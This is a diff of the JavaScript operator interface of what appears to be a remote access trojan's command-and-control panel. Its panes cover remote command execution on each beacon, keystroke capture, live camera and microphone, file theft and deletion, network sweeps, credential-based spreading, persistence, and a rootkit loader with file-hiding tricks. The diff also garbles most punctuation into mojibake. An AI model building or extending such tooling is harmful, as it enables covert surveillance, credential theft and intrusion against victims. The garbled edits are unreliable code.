@@ -74,7 +74,7 @@ export const host = {
             ${s.streams?.cam ? '<span class="badge violet">camera live</span>' : ''}
             ${s.streams?.mic ? '<span class="badge violet">mic live</span>' : ''}
           </h1>
-          <div class="sub">${esc(s.host?.user || '?')}@${esc(s.remote || s.host?.ip || '?')} · ${esc(s.id)}</div>
+          <div class="sub">${esc(s.host?.user || '?')}@${esc(s.remote || s.host?.ip || '?')} Ã‚Â· ${esc(s.id)}</div>
         </div>
         <div class="spacer"></div>
         <div class="row wrap">
@@ -84,11 +84,11 @@ export const host = {
         </div>
       </div>
       <div class="host-facts">
-        <span class="fact">${ico('i-desktop')} ${esc(s.host?.os || 'unknown')} · ${esc(s.host?.arch || '?')}</span>
-        <span class="fact">${ico('i-network')} ${esc(s.host?.ip || s.remote || '—')}</span>
+        <span class="fact">${ico('i-desktop')} ${esc(s.host?.os || 'unknown')} Ã‚Â· ${esc(s.host?.arch || '?')}</span>
+        <span class="fact">${ico('i-network')} ${esc(s.host?.ip || s.remote || 'Ã¢â‚¬â€')}</span>
         <span class="fact">${ico('i-clock')} seen ${ago(s.last_seen, store.state.now)} ago</span>
         <span class="spacer"></span>
-        <span class="presence">${ico('i-pulse')} beacon ${s.sleep}s ± ${s.jitter}%
+        <span class="presence">${ico('i-pulse')} beacon ${s.sleep}s Ã‚Â± ${s.jitter}%
           <span class="bar"><i style="width:${Math.round(beaconProgress(s, store.state.now) * 100)}%"></i></span></span>
       </div>
     </div>`;
@@ -164,10 +164,10 @@ export const host = {
       <div class="term" id="term"></div>
       <div class="composer">
         <select class="sel" id="ctype">${TYPES.map(([v, l]) => `<option value="${v}">${l}</option>`).join('')}</select>
-        <input class="inp" id="cin" placeholder="command to run on the next beacon…" autocomplete="off" spellcheck="false">
+        <input class="inp" id="cin" placeholder="command to run on the next beaconÃ¢â‚¬Â¦" autocomplete="off" spellcheck="false">
         <button class="btn primary" id="crun">${ico('i-bolt')} Run</button>
       </div>
-      <div class="hint-row">${ico('i-info')} results arrive when the host beacons (every ${s.sleep}s ± ${s.jitter}%).</div>`;
+      <div class="hint-row">${ico('i-info')} results arrive when the host beacons (every ${s.sleep}s Ã‚Â± ${s.jitter}%).</div>`;
 
     const term = body.querySelector('#term');
     const input = body.querySelector('#cin');
@@ -262,12 +262,12 @@ export const host = {
       pathInput.value = path;
       if (!rows.length) {
         tbody.innerHTML = `<tr><td colspan="3"><div class="center-note">${ico('i-info')}
-          <span>Nothing loaded — press <b>List</b> to read ${esc(path)}.</span></div></td></tr>`;
+          <span>Nothing loaded Ã¢â‚¬â€ press <b>List</b> to read ${esc(path)}.</span></div></td></tr>`;
         return;
       }
       tbody.innerHTML = rows.map((e) => `<tr data-name="${esc(e.name)}" data-dir="${e.dir ? 1 : 0}">
         <td><span class="fname ${e.dir ? 'dir' : ''}">${ico(e.dir ? 'i-folder' : 'i-file')}${esc(e.name)}</span></td>
-        <td class="num">${e.dir ? '—' : bytes(e.size)}</td>
+        <td class="num">${e.dir ? 'Ã¢â‚¬â€' : bytes(e.size)}</td>
         <td><div class="actions">
           ${e.dir ? '' : `<button class="btn ghost sm ico-only" data-act="get" title="Download">${ico('i-down')}</button>`}
           <button class="btn ghost sm ico-only" data-act="rm" title="Delete">${ico('i-trash')}</button>
@@ -340,7 +340,7 @@ export const host = {
   pane_keylog(body, s, ctx) {
     body.innerHTML = `
       <div class="kl-bar">
-        <span class="kl-stat" id="klstate"><span class="dot"></span><span>checking…</span></span>
+        <span class="kl-stat" id="klstate"><span class="dot"></span><span>checkingÃ¢â‚¬Â¦</span></span>
         <button class="btn primary sm" id="kltoggle">${ico('i-bolt')} Start capture</button>
         <button class="btn sm" id="kldump">${ico('i-down')} Dump now</button>
         <button class="btn sm ghost" id="klclear">${ico('i-trash')} Clear archive</button>
@@ -350,13 +350,13 @@ export const host = {
       </div>
       <div class="kl-bar">
         <div class="search" style="flex:1 1 220px;max-width:330px">${ico('i-search')}
-          <input class="inp sm" id="klfilter" placeholder="Filter keystrokes…" autocomplete="off"></div>
+          <input class="inp sm" id="klfilter" placeholder="Filter keystrokesÃ¢â‚¬Â¦" autocomplete="off"></div>
         <label class="tgl"><input type="checkbox" id="klfollow" checked> Follow tail</label>
         <input class="inp sm mono" id="kldevice" placeholder="device (blank = auto)" style="max-width:230px">
       </div>
-      <pre class="kl-out" id="klout"><span class="none">Reading the archive…</span></pre>
+      <pre class="kl-out" id="klout"><span class="none">Reading the archiveÃ¢â‚¬Â¦</span></pre>
       <div class="kl-foot">
-        <span id="klmeta">—</span>
+        <span id="klmeta">Ã¢â‚¬â€</span>
         <span class="spacer"></span>
         <span>${ico('i-info')} dumps collect every 5 s automatically while armed; Windows uses
           GetAsyncKeyState, Linux needs read access to /dev/input.</span>
@@ -384,7 +384,7 @@ export const host = {
       if (!rows.length) {
         out.innerHTML = `<span class="none">${lines.length
           ? 'No line matches the filter.'
-          : 'Nothing captured yet — press Start capture, then type on the target.'}</span>`;
+          : 'Nothing captured yet Ã¢â‚¬â€ press Start capture, then type on the target.'}</span>`;
         return;
       }
       out.innerHTML = rows.slice(-900).map((l, i) => `
@@ -396,7 +396,7 @@ export const host = {
     const absorb = (data) => {
       lines = data.lines || [];
       paintState(data.on);
-      meta.textContent = `${data.chars.toLocaleString()} chars · ${data.dumps} dump(s) · device ${data.device || 'auto'}`;
+      meta.textContent = `${data.chars.toLocaleString()} chars Ã‚Â· ${data.dumps} dump(s) Ã‚Â· device ${data.device || 'auto'}`;
       if (lines.length !== lastCount) { lastCount = lines.length; render(); }
     };
 
@@ -528,14 +528,16 @@ export const host = {
       camTimer = setInterval(frame, 700);
     };
 
+    const waveBg = () => getComputedStyle(document.documentElement).getPropertyValue('--bg-0').trim() || '#05080b';
+
     const drawWave = () => {
       const g = wave.getContext('2d');
-      g.fillStyle = '#05080b';
+      g.fillStyle = waveBg();
       g.fillRect(0, 0, wave.width, wave.height);
       if (!analyser) return;
       const buf = new Uint8Array(analyser.frequencyBinCount);
       analyser.getByteTimeDomainData(buf);
-      g.strokeStyle = '#2fe0a1';
+      g.strokeStyle = getComputedStyle(document.documentElement).getPropertyValue('--signal').trim() || '#e4ab25';
       g.lineWidth = 1.4;
       g.beginPath();
       for (let i = 0; i < buf.length; i++) {
@@ -557,7 +559,7 @@ export const host = {
       analyser = null;
       meter.style.width = '0';
       const g = wave.getContext('2d');
-      g.fillStyle = '#05080b';
+      g.fillStyle = waveBg();
       g.fillRect(0, 0, wave.width, wave.height);
     };
 
@@ -639,7 +641,7 @@ export const host = {
     body.innerHTML = `
       <div class="row">
         <div class="search proc-search">${ico('i-search')}
-          <input class="inp sm" id="pq" placeholder="Filter by name, user or pid…" autocomplete="off"></div>
+          <input class="inp sm" id="pq" placeholder="Filter by name, user or pidÃ¢â‚¬Â¦" autocomplete="off"></div>
         <button class="btn sm" id="prefresh">${ico('i-refresh')} Refresh</button>
         <span class="spacer"></span><span class="dim tiny" id="pcount"></span>
       </div>
@@ -658,13 +660,13 @@ export const host = {
       body.querySelector('#pcount').textContent = `${list.length} of ${rows.length} process(es)`;
       if (!list.length) {
         tbody.innerHTML = `<tr><td colspan="5"><div class="center-note">${ico('i-cpu')}
-          <span>No process loaded — press <b>Refresh</b>.</span></div></td></tr>`;
+          <span>No process loaded Ã¢â‚¬â€ press <b>Refresh</b>.</span></div></td></tr>`;
         return;
       }
       tbody.innerHTML = list.map((p) => `<tr data-pid="${p.pid}">
         <td class="num">${p.pid}</td>
-        <td class="mono dim">${esc(p.user || '—')}</td>
-        <td class="num">${p.cpu == null ? esc(p.mem || '—') : p.cpu.toFixed(1) + '%'}</td>
+        <td class="mono dim">${esc(p.user || 'Ã¢â‚¬â€')}</td>
+        <td class="num">${p.cpu == null ? esc(p.mem || 'Ã¢â‚¬â€') : p.cpu.toFixed(1) + '%'}</td>
         <td class="mono">${esc(clip(p.command, 120))}</td>
         <td><div class="actions">
           <button class="btn ghost sm" data-kill="${p.pid}" title="Kill process">${ico('i-warn')}</button>
@@ -683,7 +685,7 @@ export const host = {
 
     if (s.last_ps?.length) { rows = s.last_ps; paint(); }
     else { tbody.innerHTML = `<tr><td colspan="5"><div class="center-note">${ico('i-cpu')}
-      <span>Refreshing the process table…</span></div></td></tr>`; this.run(s, 'processes', {}, true); }
+      <span>Refreshing the process tableÃ¢â‚¬Â¦</span></div></td></tr>`; this.run(s, 'processes', {}, true); }
 
     return {
       refresh: () => {
@@ -741,12 +743,12 @@ export const host = {
       await this.run(s, 'network', {
         subnet: body.querySelector('#ssubnet').value.trim(), ports: sport.value.trim(),
       }, true);
-      toast('sweep queued — results land when the host beacons');
+      toast('sweep queued Ã¢â‚¬â€ results land when the host beacons');
     };
     body.querySelector('#snet').onclick = async () => {
       const rec = await api.command(s.id, 'netstat', {}).catch((e) => { toast(e.message, 'bad'); return null; });
       if (rec) {
-        body.querySelector('#sout').textContent = 'netstat queued…';
+        body.querySelector('#sout').textContent = 'netstat queuedÃ¢â‚¬Â¦';
         const wait = setInterval(async () => {
           if (!document.contains(body)) { clearInterval(wait); return; }
           const tl = store.get(s.id)?.timeline || [];
@@ -847,7 +849,7 @@ export const host = {
         user: body.querySelector('#f_user')?.value.trim(),
         pass: body.querySelector('#f_pass')?.value.trim(),
       }, true);
-      out.textContent = 'spread queued — the log follows on the next beacon';
+      out.textContent = 'spread queued Ã¢â‚¬â€ the log follows on the next beacon';
     };
 
     ctx.last = () => {};
@@ -884,7 +886,7 @@ export const host = {
     const out = body.querySelector('#peout');
     body.querySelector('#pego').onclick = async () => {
       await this.run(s, 'persistence', { sub: body.querySelector('#pemethod').value }, true);
-      out.textContent = 'persistence queued — output follows on the next beacon';
+      out.textContent = 'persistence queued Ã¢â‚¬â€ output follows on the next beacon';
     };
     const wait = setInterval(() => {
       if (!document.contains(body)) { clearInterval(wait); return; }
@@ -912,7 +914,7 @@ export const host = {
             <button class="btn primary" id="rkgo">${ico('i-ghost')} Apply</button></label>
         </div>
         <p class="muted tiny">Linux loads <code>phantom_rootkit.ko</code> from
-          <code>/tmp</code> — upload it first with the file browser. Windows hides a system copy with
+          <code>/tmp</code> Ã¢â‚¬â€ upload it first with the file browser. Windows hides a system copy with
           <code>attrib +h +s</code> and a masqueraded Run key.</p>
       </div></div>
       <pre class="logbox" id="rkout">no run yet</pre>`;
@@ -951,7 +953,7 @@ export const host = {
           <div class="card-head">${ico('i-info')}<h3>Reported identity</h3><span class="spacer"></span>
             <button class="btn ghost sm" id="ijson">${ico('i-copy')} Copy JSON</button></div>
           <div class="card-body"><dl class="kv">${rows.map(([k, v]) =>
-            `<dt>${esc(k)}</dt><dd>${esc(v || '—')}</dd>`).join('')}</dl></div>
+            `<dt>${esc(k)}</dt><dd>${esc(v || 'Ã¢â‚¬â€')}</dd>`).join('')}</dl></div>
         </div>
         <div class="card">
           <div class="card-head">${ico('i-clock')}<h3>Beacon & annotations</h3></div>
